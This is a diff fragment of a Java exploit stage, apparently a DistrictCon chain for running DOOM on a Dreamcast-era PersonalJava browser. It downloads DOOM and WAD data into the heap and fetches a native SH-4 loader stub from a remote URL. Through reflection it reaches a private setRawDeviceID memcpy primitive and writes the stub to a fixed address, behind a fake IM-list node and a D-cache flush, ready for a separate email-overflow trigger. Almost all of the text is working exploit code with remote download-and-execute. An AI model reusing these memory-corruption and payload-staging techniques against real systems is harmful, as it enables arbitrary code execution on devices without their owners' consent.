+    static byte[] g_keepalive;   // keep the transport byte[] in the heap for the native scan
+    static boolean g_running;    // guard: the Eden client can re-subscribe + re-spawn us while a
+                                 // (slow) download is in flight; only ONE instance may run it.
+
+    static final int DST      = 0x8C29ABE6;   // setRawDeviceID memcpy dest (fixed)
+    static final int STUB_OFF = 0x202;        // stub offset in buffer -> DST+0x202 = 0x8C29ADE8 (4-aligned)
+    static final int GET_RID  = 101;          // getRawDeviceID: read buffer at DST -> byte[]
+    static final int SET_RID  = 100;          // setRawDeviceID: memcpy(DST, byte[], len)
+
+    public ServiceInfo getInfo() {
+        return new ServiceInfo("StageDoom", "2.0", "DistrictCon", Junk.BASE);
+    }
+
+    // content-length probe with the SAME timeout+retry discipline as readInto: on the flaky
+    // emulated BBA this connect can HANG, and with no timeout it wedges run() before a single
+    // byte of DOOM is fetched (the Eden client then re-subscribes and re-spawns us -> pileup).
+    static int clen(final String u) throws Exception {
+        for (int attempt = 0; attempt < 30; attempt++) {
+            final int[] rn = { -2 };
+            Thread t = new Thread(new Runnable() { public void run() {
+                try {
+                    java.net.HttpURLConnection c = (java.net.HttpURLConnection) new URL(u).openConnection();
+                    int n = c.getContentLength(); c.getInputStream().close(); rn[0] = n;
+                } catch (Exception e) { rn[0] = -1; }
+            }});
+            t.setDaemon(true); t.start();
+            t.join(15000);
+            if (rn[0] > 0) return rn[0];
+            Eden.println("[~] clen retry " + attempt + " for " + u);
+            try { Thread.sleep(500); } catch (Exception ig) {}
+        }
+        throw new Exception("clen failed after retries for " + u);
+    }
+
+    static void readInto(final String u, byte[] buf, int off, int len) throws Exception {
+        // CHUNKED + per-chunk TIMEOUT download. Flycast's emulated BBA (picoppp userspace TCP)
+        // is built for small gaming packets, not bulk HTTP: it wedges the browser's net thread
+        // after a few dozen connections (empirically ~40, staging died at ~1.3MB with 32KB
+        // chunks = ~40 conns). A single huge transfer ALSO hangs it, and PersonalJava 1.1.8 has
+        // no setReadTimeout. Fix: use FEW, LARGE chunks (256KB -> ~15 connections for the whole
+        // ~3.8MB payload, well under the wedge point) and PACE them (a short sleep between
+        // chunks lets picoppp finish tearing down each connection before we open the next). Each
+        // chunk still runs in a throwaway thread with a generous timeout; on hang/short we abandon
+        // (it read into a temp buffer -> no corruption) and retry the SAME ?start=N&len=M offset.
+        final int CHUNK = 262144;          // 256KB: the reliable READ size (448KB/512KB reads hang the net
+                                           // thread -- stalled at chunk 1). The connection-accumulation that
+                                           // used to kill 256KB near the end is fixed emulator-side now
+                                           // (picoppp linger 10s->1s frees each connection's heap fast), so
+                                           // ~14 connections no longer exhaust picotcp -> streams to the end.
+        final int TIMEOUT = 45000;         // 45s/chunk -- generous for 256KB over the slow link
+        int got = 0, fails = 0;
+        byte[] scratch = new byte[CHUNK];   // REUSED across chunks (fresh only after a timeout, so a
+                                            // timed-out zombie reader can't corrupt the next chunk)
+        while (got < len) {
+            final int want = (len - got < CHUNK) ? (len - got) : CHUNK;
+            final int start = got;
+            final byte[] tmp = scratch;   // this iteration's buffer instance (captured by the reader)
+            final int[] rn = { -1 };
+            final InputStream[] inh = { null };
+            Thread t = new Thread(new Runnable() { public void run() {
+                try {
+                    InputStream in = new URL(u + "?start=" + start + "&len=" + want).openStream();
+                    inh[0] = in;
+                    int n, p = 0;
+                    while (p < want && (n = in.read(tmp, p, want - p)) > 0) p += n;
+                    try { in.close(); } catch (Exception e) {}
+                    rn[0] = p;
+                } catch (Exception e) { rn[0] = -1; }
+            }});
+            t.setDaemon(true); t.start();
+            t.join(TIMEOUT);
+            if (rn[0] == want) {                            // full chunk -> commit it
+                System.arraycopy(tmp, 0, buf, off + start, want);
+                got += want; fails = 0;
+                // buffer REUSE (above) removes the per-chunk 256KB temp churn. Do NOT force
+                // System.gc()/runFinalization() here: doing so every chunk crashed the EMULATED
+                // browser at ~chunk 10 (it moves/finalizes native-backed socket objects mid-download
+                // -> picoppp desync). A light pace lets picoppp reap the connection instead.
+                try { Thread.sleep(250); } catch (Exception ig) {}
+            } else {                                        // hung or short -> abandon + retry offset
+                try { if (inh[0] != null) inh[0].close(); } catch (Exception e) {}
+                scratch = new byte[CHUNK];   // fresh buffer -> the timed-out zombie keeps the old 'tmp'
+                if (++fails > 80) throw new Exception("stalled at " + got + "/" + len + " for " + u);
+                try { Thread.sleep(500); } catch (Exception ig) {}   // back off before re-opening
+            }
+        }
+    }
+
+    static byte[] httpGetAll(String u) throws Exception {
+        InputStream in = new URL(u).openStream();
+        byte[] tmp = new byte[65536]; int total = 0, n;
+        byte[] out = new byte[0];
+        while ((n = in.read(tmp)) > 0) {
+            byte[] nn = new byte[total + n];
+            System.arraycopy(out, 0, nn, 0, total);
+            System.arraycopy(tmp, 0, nn, total, n);
+            out = nn; total += n;
+        }
+        in.close();
+        return out;
+    }
+
+    public void run() {
+        synchronized (StageDoom.class) {
+            if (g_running) { Eden.println("[i] StageDoom already staging -- ignoring re-spawn"); return; }
+            g_running = true;
+        }
+        Junk.banner("CHAIN stagedoom v2 -- HTTP-stage blob + plant native stub @0x8C29ADE8");
+        Junk.prove();
+        try {
+            // (1) TRANSPORT: stage MAGIC+doom+wad into the JVM heap (the stub scans for this)
+            int doomLen = clen(DOOM_URL), wadLen = clen(WAD_URL);
+            byte[] dd = new byte[8 + doomLen + wadLen];
+            readInto(DOOM_URL, dd, 8, doomLen);
+            readInto(WAD_URL,  dd, 8 + doomLen, wadLen);
+            // MAGIC written LAST -- a partial/failed download (readInto throws on the flaky
+            // link) leaves a dd in the heap WITHOUT the magic, so the native scanner skips it
+            // and only ever finds a COMPLETE blob. (Bug: magic-first let the scanner copy a
+            // WAD truncated at 343KB -> PNAMES missing -> R_Init I_Error -> hang.)
+            System.arraycopy(MAGIC, 0, dd, 0, 8);
+            g_keepalive = dd;     // pin in heap for the native loader's MAGIC scan
+            String msg = "staged doom=" + doomLen + " wad=" + wadLen
+                       + " byte[]=" + dd.length + " (MAGIC+doom+wad, raw, kept alive)";
+            Eden.println("[+] " + msg);
+            try { Junk.httpPost(Junk.BASE + "/heap", msg + "\n"); } catch (Throwable ig) {}
+
+            // (2) PLACEMENT LAST: plant the stub only AFTER the (slow, flaky) download is done,
+            //     so the fake IM node at 0x46 sits for the brief moment before the user clicks
+            //     -- not through the whole download where an IM teardown can fault on it.
+            plantStub();
+            Eden.println("[+] READY: blob staged + stub planted -> open DOOM-STAGE to fire");
+        } catch (Throwable t) {
+            Eden.println("[!] stagedoom: " + t); t.printStackTrace();
+        }
+    }
+
+    static void p32(byte[] b, int o, int v) {
+        b[o]=(byte)v; b[o+1]=(byte)(v>>8); b[o+2]=(byte)(v>>16); b[o+3]=(byte)(v>>24);
+    }
+
+    // Plant our SH-4 loader stub at the FIXED, deterministic address 0x8C29ADE8 via the
+    // setRawDeviceID(100) memcpy primitive. We cannot read back the buffer (getRawDeviceID
+    // returns only 8 bytes), so -- following the proven RawDeviceIDExploit layout that
+    // survives planting -- we keep a VALID IM-list node at DST+0x46 (zeroing it crashes the
+    // browser) but make its teardown-unlink write to harmless scratch, so the stub is NOT
+    // auto-triggered: the only trigger is the reliable email overflow (saved-PR=stub addr).
+    void plantStub() throws Exception {
+        byte[] stub = httpGetAll(STUB_URL);
+        Eden.println("[*] fetched native stub: " + stub.length + " bytes");
+
+        SystemInterface si = Eden.getSystemInterface();
+        Method m = SystemInterface.class.getDeclaredMethod(
+            "sendMessage", new Class[]{ Integer.TYPE, Object.class, Object.class });
+        m.setAccessible(true);
+
+        // preserve the 8-byte device ID (offset 0) just in case the browser reads it
+        Object r = m.invoke(si, new Object[]{ new Integer(GET_RID), null, null });
+        byte[] devid = (r instanceof byte[]) ? (byte[]) r : new byte[0];
+
+        final int OFF_FAKE = 0x100;                 // fake IM node struct
+        final int OFF_SCRATCH = 0x1C0;              // harmless unlink write target (zeroed gap)
+        int fakeAddr = DST + OFF_FAKE;
+
+        byte[] buf = new byte[STUB_OFF + stub.length];   // 0x202 + 362 = 0x36C
+        System.arraycopy(devid, 0, buf, 0, devid.length > 8 ? 8 : devid.length);
+        // IM-list head -> our fake node (keeps the IM subsystem from derefing null)
+        p32(buf, 0x46, fakeAddr);
+        // fake node: unlink does *(prev+0x3C) = next.  Make it harmless:
+        //   prev+0x3C = DST+OFF_SCRATCH (zeroed buffer scratch);  next = 0
+        p32(buf, OFF_FAKE + 0x3C, 0);                          // next = 0 (terminates iteration)
+        p32(buf, OFF_FAKE + 0x40, (DST + OFF_SCRATCH) - 0x3C); // prev -> harmless scratch write
+        // the loader stub at the deterministic address
+        System.arraycopy(stub, 0, buf, STUB_OFF, stub.length);
+
+        m.invoke(si, new Object[]{ new Integer(SET_RID), buf, null });
+
+        // SH-4 D-CACHE FLUSH (real hardware; a harmless no-op under Flycast). setRawDeviceID wrote
+        // the stub through the WRITE-BACK D-cache, so it sits DIRTY in the 16KB cache, NOT in RAM.
+        // When the email overflow later returns into 0x8C29ADE8, the SH-4 INSTRUCTION fetch reads
+        // RAM (it does NOT snoop the D-cache) and gets STALE bytes -> instant crash (no flicker).
+        // Touch 64KB of fresh memory to cycle the whole D-cache (>=4x its size), forcing every dirty
+        // line -- including the stub's ~48 lines -- to be written back to RAM before the jump.
+        byte[] flush = new byte[65536];
+        int acc = 0;
+        for (int i = 0; i < flush.length; i += 32) { flush[i] = (byte) i; acc ^= flush[i]; }
+        Eden.println("[+] planted stub @0x8C29ADE8 (DST+0x202), buf=" + buf.length
+                     + " -- D-cache flushed to RAM via 64KB churn (acc=" + acc + ")");
+    }
+}
+
+```
